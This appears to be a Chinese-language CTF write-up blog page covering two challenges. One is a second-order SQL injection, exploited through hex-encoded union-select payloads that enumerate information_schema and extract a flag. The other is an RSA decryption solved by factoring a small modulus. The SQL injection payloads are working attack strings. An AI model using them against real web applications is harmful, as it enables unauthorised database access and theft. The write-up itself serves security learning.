@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="default">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="m3lon">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Buy Flag这道题跟今天强网杯的Three hit如出一辙，题目是一个二次注入，用户注册会将age存入数据库，登陆成功后index.php界面会从数据库中查询具有相同age的username。 二次注入：源于开发人员对数据库中的数据太过信任，凡是提取数据库中来自用户的数据不经过处理，即可触发二次注入。 刚开始做这道题的时候查看html源码发现 1234567891011  function B">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TSCTF Misc&amp;Web writeup">
+<meta property="og:url" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/index.html">
+<meta property="og:site_name" content="m3lon">
+<meta property="og:description" content="Buy Flag这道题跟今天强网杯的Three hit如出一辙，题目是一个二次注入，用户注册会将age存入数据库，登陆成功后index.php界面会从数据库中查询具有相同age的username。 二次注入：源于开发人员对数据库中的数据太过信任，凡是提取数据库中来自用户的数据不经过处理，即可触发二次注入。 刚开始做这道题的时候查看html源码发现 1234567891011  function B">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/2.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/3.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/4.png">
+<meta property="og:updated_time" content="2019-02-21T12:04:54.419Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TSCTF Misc&amp;Web writeup">
+<meta name="twitter:description" content="Buy Flag这道题跟今天强网杯的Three hit如出一辙，题目是一个二次注入，用户注册会将age存入数据库，登陆成功后index.php界面会从数据库中查询具有相同age的username。 二次注入：源于开发人员对数据库中的数据太过信任，凡是提取数据库中来自用户的数据不经过处理，即可触发二次注入。 刚开始做这道题的时候查看html源码发现 1234567891011  function B">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/2.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/">
+
+
+
+
+
+  <title>TSCTF Misc&Web writeup | m3lon</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-113184689-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+  <style>
+	blockquote {
+	  color: #888;
+	  background-color: #eae6f3;
+	  border-left: 1rem solid #5236a0;
+	  padding: 0 1.5rem;
+	  position: relative;
+	  font-family: 'Roboto', sans-serif;
+	}
+
+	blockquote:before,
+	blockquote:after {
+	  color: #392570;
+	  font-size: 2.5rem;
+	  position: absolute;
+	  line-height: 2.5rem;
+	}
+
+	blockquote:before {
+	  content: "\201C";
+	  left: -1rem;
+	  top: 0;
+	}
+
+	blockquote:after {
+	  content: "\201D";
+	  right: 0;
+	  bottom: -1rem;
+	}
+</style>
+</head>
+
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">m3lon</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="m3lon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/UMR.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m3lon">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TSCTF Misc&Web writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-29T12:08:06+08:00">
+                2018-05-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="Buy-Flag"><a href="#Buy-Flag" class="headerlink" title="Buy Flag"></a>Buy Flag</h3><p>这道题跟今天强网杯的<code>Three hit</code>如出一辙，题目是一个二次注入，用户注册会将age存入数据库，登陆成功后index.php界面会从数据库中查询具有相同age的username。</p>
+<p><strong>二次注入</strong>：源于开发人员对数据库中的数据太过信任，凡是提取数据库中来自用户的数据不经过处理，即可触发二次注入。</p>
+<p>刚开始做这道题的时候查看html源码发现</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">BuyFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="literal">true</span>)&#123;</span><br><span class="line">	alert(<span class="string">'Please sign in first!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(<span class="number">18</span>&gt;<span class="number">18</span>)&#123;</span><br><span class="line">          alert(<span class="string">'You are too old to buy it!'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          alert(<span class="string">'Amazing, maybe, i said maybe, you can bug it!'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>很容易可以利用age=18绕过，然而并没有什么用…</p>
+<p>发现age必须为数字。可以通过<strong>hex编码绕过</strong>，于是开始下面的测试过程</p>
+<p>测试过程：</p>
+<ul>
+<li><p>判断为 “字符型注入”</p>
+<p>1’ 即 age=0x3127 注册成功， 登陆成功&amp;页面显示异常</p>
+<p>1’#   age=0x312723 注册成功， 登陆成功&amp;页面显示正常</p>
+</li>
+</ul>
+<ul>
+<li><p>寻找注入点</p>
+<p>其实这一步是在不停的胡乱测试中偶然发现的 2333…  发现这里的内部并不是固定的</p>
+<p>1’ and 1=2# </p>
+<p><img src="2.png" alt=""></p>
+</li>
+</ul>
+<ul>
+<li><p>判断字段数<br>1’ order by 1#        正常<br>1’ order by 2#        异常<br>1’ and 1=2 union select 123#  注入点处显示123</p>
+<p><img src="3.png" alt=""></p>
+</li>
+<li><p>爆库</p>
+</li>
+</ul>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> <span class="built_in">select</span> database()<span class="meta"># </span></span><br><span class="line"><span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> <span class="built_in">select</span> group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()<span class="meta">#    children,py_flag</span></span><br><span class="line"><span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> <span class="built_in">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name='py_flag'<span class="meta">#  Id,tsctf_fla9 </span></span><br><span class="line"><span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> <span class="built_in">select</span> tsctf_fla9 from py_flag<span class="meta">#  TSCTF&#123;Simple_Sql_f0r_Y0u&#125;</span></span><br></pre></td></tr></table></figure>
+<p> <img src="4.png" alt=""></p>
+<h3 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h3><p>010Editor打开图片发现隐藏的rsa参数</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">n</span>=<span class="number">52</span>A99E249EE7CF3C0CBF963A009661772BC9CDF6E1E3FBFC6E44A07A5E0F894457A9F81C3AE132AC5683D35B28BA5C324243</span><br><span class="line">十进制=<span class="number">833810193564967701912362955539789451139872863794534923259743419423089229206473091408403560311191545764221310666338878019</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">010001</span></span><br><span class="line">=&gt;<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">cipher=<span class="number">18228</span>DF578DAD6DC893CBCD95BD934D28F26C820778E7AFEB6B3BE38FD5298E497FAF8CEAA78C613E5F5FADD4BD5E50FD8A5</span><br><span class="line">=&gt; <span class="number">2434474437519739825285674247289880763631199976378755148355551547916734778248566</span> <span class="number">81065818912755263077705578942115259340965</span></span><br></pre></td></tr></table></figure>
+<p>已知n、e、cipher, 来恢复明文，利用在线因式分解<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> (注: 输入需要为十进制)，或者使用工具yafu分解</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">p</span> = <span class="number">863653476616376575308866344984576466644942572246900013156919</span></span><br><span class="line"><span class="attr">q</span> = <span class="number">965445304326998194798282228842484732438457170595999523426901</span></span><br></pre></td></tr></table></figure>
+<p>已知p、q、e、c，求明文</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">computeD</span><span class="params">(fn, e)</span>:</span>  </span><br><span class="line">    (x, y, r) = extendedGCD(fn, e)  </span><br><span class="line">    <span class="comment">#y maybe &lt; 0, so convert it  </span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">return</span> fn + y  </span><br><span class="line">    <span class="keyword">return</span> y  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extendedGCD</span><span class="params">(a, b)</span>:</span>  </span><br><span class="line">    <span class="comment">#a*xi + b*yi = ri  </span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)  </span><br><span class="line">    <span class="comment">#a*x1 + b*y1 = a  </span></span><br><span class="line">    x1 = <span class="number">1</span>  </span><br><span class="line">    y1 = <span class="number">0</span>  </span><br><span class="line">    <span class="comment">#a*x2 + b*y2 = b  </span></span><br><span class="line">    x2 = <span class="number">0</span>  </span><br><span class="line">    y2 = <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:  </span><br><span class="line">        q = a / b  </span><br><span class="line">        <span class="comment">#ri = r(i-2) % r(i-1)  </span></span><br><span class="line">        r = a % b  </span><br><span class="line">        a = b  </span><br><span class="line">        b = r  </span><br><span class="line">        <span class="comment">#xi = x(i-2) - q*x(i-1)  </span></span><br><span class="line">        x = x1 - q*x2  </span><br><span class="line">        x1 = x2  </span><br><span class="line">        x2 = x  </span><br><span class="line">        <span class="comment">#yi = y(i-2) - q*y(i-1)  </span></span><br><span class="line">        y = y1 - q*y2  </span><br><span class="line">        y1 = y2  </span><br><span class="line">        y2 = y  </span><br><span class="line">    <span class="keyword">return</span>(x1, y1, a)  </span><br><span class="line">  </span><br><span class="line">p = <span class="number">863653476616376575308866344984576466644942572246900013156919</span>  </span><br><span class="line">q = <span class="number">965445304326998194798282228842484732438457170595999523426901</span>  </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0x18228DF578DAD6DC893CBCD95BD934D28F26C820778E7AFEB6B3BE38FD5298E497FAF8CEAA78C613E5F5FADD4BD5E50FD8A5</span>  </span><br><span class="line">  </span><br><span class="line">n = p * q  </span><br><span class="line">fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">d = computeD(fn, e)  </span><br><span class="line">m = pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+<p>flag: TSCTF{ez_rsa_real_ez~}</p>
+<p>个人感受：</p>
+<ul>
+<li>各种进制转换，尤其是位数较长的，再也不相信在线网站的转换了！！！</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="m3lon WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/29/RCTF-r-cursive-wp/" rel="next" title="RCTF 2018 r-cursive wp">
+                <i class="fa fa-chevron-left"></i> RCTF 2018 r-cursive wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/29/python-进制、字符串、字节串之间各种转换/" rel="prev" title="python 进制、字符串、字节串之间各种转换">
+                python 进制、字符串、字节串之间各种转换 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMzYxOC8xMDE3Mw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/UMR.png" alt="m3lon">
+            
+              <p class="site-author-name" itemprop="name">m3lon</p>
+              <p class="site-description motion-element" itemprop="description">萌新一枚</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/CTF/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://lambdax.me/" title="Lambdax" target="_blank">Lambdax</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.51cto.com/skytina" title="skytina" target="_blank">skytina</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://idoge.cc/" title="Dik1s" target="_blank">Dik1s</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.cnblogs.com/iamstudy" title="l3m0n" target="_blank">l3m0n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://o0xmuhe.github.io/" title="0xmuhe" target="_blank">0xmuhe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://k1n9.me/" title="k1n9" target="_blank">k1n9</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://stone.moe/" title="StoneMoe" target="_blank">StoneMoe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://pi4net.com/" title="pi4net" target="_blank">pi4net</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Buy-Flag"><span class="nav-number">1.</span> <span class="nav-text">Buy Flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#简单的RSA"><span class="nav-number">2.</span> <span class="nav-text">简单的RSA</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m3lon</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
